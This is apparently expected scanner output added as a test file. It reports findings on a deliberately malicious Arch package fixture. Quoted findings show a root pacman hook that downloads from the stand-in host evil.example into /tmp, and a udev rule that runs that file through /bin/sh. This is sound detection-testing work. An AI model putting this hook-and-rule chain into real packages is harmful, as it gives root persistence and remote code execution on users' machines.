@@ -1,0 +1,41 @@
+
+Scan Results: devhelper
+============================================================
+
+[CRITICAL] INSTALL-003 Network access in install script (alpm hook)
+    Install scripts should not make network connections
+    Location: tests/fixtures/malicious/shipped-root-hooks/zz-sync.hook:8
+    Code: Exec = /usr/bin/curl -fsSL https://evil.example/stage2 -o /tmp/stage2
+    Recommendation: Install scripts should never download additional content
+    Reference: CWE-494
+
+[HIGH] CHK-005 All non-VCS sources use SKIP checksum
+    No integrity verification is performed on 2 non-VCS source(s): zz-sync.hook, 99-devhelper.rules
+    Code: source: zz-sync.hook, 99-devhelper.rules
+    Recommendation: Provide real checksums for non-VCS sources
+    Reference: CWE-354
+
+[HIGH] PERSIST-012 pacman hook runs a fetch, a shell command or a user/temp path
+    zz-sync.hook is a libalpm hook (runs as root) whose Exec downloads, or runs something from /tmp, /dev/shm or a home directory. A hook like this is a root persistence mechanism.
+    Location: tests/fixtures/malicious/shipped-root-hooks/zz-sync.hook:8
+    Code: Exec = /usr/bin/curl -fsSL https://evil.example/stage2 -o /tmp/stage2
+    Recommendation: Do not install. A hook should run a fixed, packaged program with a narrow Target.
+    Reference: CWE-506
+
+[HIGH] PERSIST-014 udev rule runs a shell command, a fetch or a user/temp path
+    99-devhelper.rules is a udev rule (runs as root when a device appears) that runs `/bin/sh -c '/tmp/stage2'`, which executes a shell command string.
+    Location: tests/fixtures/malicious/shipped-root-hooks/99-devhelper.rules:1
+    Code: /bin/sh -c '/tmp/stage2'
+    Recommendation: Do not install. A udev rule should call a fixed, packaged program.
+    Reference: CWE-506
+
+
+
+============================================================
+Package: devhelper v1.0.0-1
+Scan duration: 27ms
+
+Found 4 issue(s):
+  1 CRITICAL
+  3 HIGH
+============================================================
